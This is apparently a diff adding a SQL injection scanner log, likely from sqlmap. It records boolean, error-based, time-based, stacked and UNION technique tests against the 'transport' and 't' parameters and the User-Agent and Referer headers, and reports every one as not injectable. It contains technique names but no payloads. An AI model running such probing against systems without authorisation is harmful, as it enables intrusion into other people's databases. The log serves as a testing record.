+[05:23:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[05:23:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[05:23:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[05:23:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[05:23:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:24] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[05:23:24] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[05:23:25] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[05:23:25] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[05:23:25] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:25] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[05:23:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[05:23:25] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[05:23:25] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[05:23:25] [INFO] testing 'Oracle error-based - Parameter replace'
+[05:23:25] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[05:23:25] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[05:23:25] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[05:23:25] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
+[05:23:25] [INFO] testing 'Generic inline queries'
+[05:23:25] [INFO] testing 'MySQL inline queries'
+[05:23:25] [INFO] testing 'PostgreSQL inline queries'
+[05:23:25] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[05:23:25] [INFO] testing 'Oracle inline queries'
+[05:23:25] [INFO] testing 'SQLite inline queries'
+[05:23:25] [INFO] testing 'Firebird inline queries'
+[05:23:25] [INFO] testing 'ClickHouse inline queries'
+[05:23:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[05:23:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[05:23:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:23:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[05:23:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[05:23:26] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[05:23:26] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[05:23:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[05:23:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[05:23:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[05:23:26] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
+[05:23:26] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
+[05:23:26] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[05:23:26] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[05:23:26] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[05:23:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[05:23:27] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[05:23:27] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[05:23:27] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[05:23:27] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'Oracle AND time-based blind'
+[05:23:27] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'Informix AND time-based blind (heavy query)'
+[05:23:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[05:23:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[05:23:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[05:23:27] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[05:23:27] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:27] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[05:23:27] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[05:23:27] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[05:23:28] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[05:23:28] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[05:23:28] [WARNING] GET parameter 'transport' does not seem to be injectable
+[05:23:28] [INFO] testing if GET parameter 't' is dynamic
+[05:23:28] [WARNING] GET parameter 't' does not appear to be dynamic
+[05:23:28] [WARNING] heuristic (basic) test shows that GET parameter 't' might not be injectable
+[05:23:28] [INFO] testing for SQL injection on GET parameter 't'
+[05:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[05:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[05:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[05:23:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[05:23:29] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[05:23:29] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[05:23:30] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:30] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[05:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[05:23:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[05:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[05:23:30] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[05:23:30] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[05:23:30] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[05:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[05:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[05:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[05:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[05:23:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[05:23:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[05:23:30] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:30] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[05:23:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[05:23:31] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[05:23:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[05:23:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[05:23:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[05:23:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[05:23:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[05:23:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[05:23:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[05:23:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[05:23:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:33] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[05:23:33] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[05:23:33] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[05:23:33] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[05:23:33] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:33] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:34] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[05:23:34] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[05:23:34] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[05:23:34] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[05:23:34] [INFO] testing 'Oracle error-based - Parameter replace'
+[05:23:34] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[05:23:34] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[05:23:34] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[05:23:34] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
+[05:23:34] [INFO] testing 'Generic inline queries'
+[05:23:34] [INFO] testing 'MySQL inline queries'
+[05:23:34] [INFO] testing 'PostgreSQL inline queries'
+[05:23:34] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[05:23:34] [INFO] testing 'Oracle inline queries'
+[05:23:34] [INFO] testing 'SQLite inline queries'
+[05:23:34] [INFO] testing 'Firebird inline queries'
+[05:23:34] [INFO] testing 'ClickHouse inline queries'
+[05:23:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[05:23:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[05:23:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:23:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[05:23:34] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[05:23:35] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[05:23:35] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[05:23:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[05:23:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[05:23:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[05:23:35] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
+[05:23:35] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
+[05:23:35] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[05:23:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[05:23:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[05:23:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[05:23:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[05:23:36] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[05:23:36] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[05:23:36] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[05:23:36] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[05:23:36] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[05:23:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[05:23:37] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[05:23:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[05:23:37] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
+[05:23:37] [INFO] testing 'Oracle AND time-based blind'
+[05:23:37] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[05:23:38] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
+[05:23:38] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[05:23:38] [INFO] testing 'Informix AND time-based blind (heavy query)'
+[05:23:38] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:38] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[05:23:38] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[05:23:38] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[05:23:38] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[05:23:38] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:38] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:38] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:38] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[05:23:38] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[05:23:38] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[05:23:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[05:23:39] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[05:23:39] [WARNING] GET parameter 't' does not seem to be injectable
+[05:23:39] [INFO] testing if parameter 'User-Agent' is dynamic
+[05:23:39] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[05:23:39] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
+[05:23:39] [INFO] testing for SQL injection on parameter 'User-Agent'
+[05:23:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[05:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[05:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[05:23:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[05:23:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[05:23:42] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[05:23:42] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:43] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[05:23:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[05:23:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[05:23:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[05:23:43] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[05:23:43] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[05:23:44] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[05:23:44] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[05:23:44] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[05:23:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[05:23:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[05:23:44] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:44] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[05:23:44] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:44] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[05:23:44] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:44] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[05:23:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[05:23:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[05:23:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[05:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[05:23:45] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[05:23:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[05:23:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[05:23:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[05:23:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[05:23:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[05:23:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:46] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[05:23:46] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[05:23:46] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[05:23:46] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[05:23:46] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:46] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[05:23:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[05:23:46] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[05:23:46] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[05:23:46] [INFO] testing 'Oracle error-based - Parameter replace'
+[05:23:46] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[05:23:46] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[05:23:46] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[05:23:46] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
+[05:23:46] [INFO] testing 'Generic inline queries'
+[05:23:46] [INFO] testing 'MySQL inline queries'
+[05:23:47] [INFO] testing 'PostgreSQL inline queries'
+[05:23:47] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[05:23:47] [INFO] testing 'Oracle inline queries'
+[05:23:47] [INFO] testing 'SQLite inline queries'
+[05:23:47] [INFO] testing 'Firebird inline queries'
+[05:23:47] [INFO] testing 'ClickHouse inline queries'
+[05:23:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[05:23:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[05:23:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:23:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[05:23:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[05:23:47] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[05:23:47] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[05:23:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[05:23:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[05:23:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[05:23:47] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
+[05:23:47] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
+[05:23:47] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[05:23:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[05:23:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[05:23:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[05:23:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[05:23:48] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[05:23:48] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[05:23:48] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[05:23:48] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[05:23:48] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[05:23:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[05:23:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[05:23:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[05:23:49] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
+[05:23:49] [INFO] testing 'Oracle AND time-based blind'
+[05:23:49] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[05:23:49] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
+[05:23:49] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[05:23:49] [INFO] testing 'Informix AND time-based blind (heavy query)'
+[05:23:49] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:49] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[05:23:49] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[05:23:49] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[05:23:49] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[05:23:49] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:49] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:49] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:49] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[05:23:49] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[05:23:50] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[05:23:50] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[05:23:50] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[05:23:50] [WARNING] parameter 'User-Agent' does not seem to be injectable
+[05:23:50] [INFO] testing if parameter 'Referer' is dynamic
+[05:23:50] [WARNING] parameter 'Referer' does not appear to be dynamic
+[05:23:50] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
+[05:23:50] [INFO] testing for SQL injection on parameter 'Referer'
+[05:23:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:23:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[05:23:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[05:23:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[05:23:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[05:23:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[05:23:52] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[05:23:52] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:52] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[05:23:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[05:23:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[05:23:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[05:23:53] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[05:23:53] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[05:23:53] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[05:23:53] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[05:23:53] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[05:23:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[05:23:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[05:23:53] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:53] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[05:23:53] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:53] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
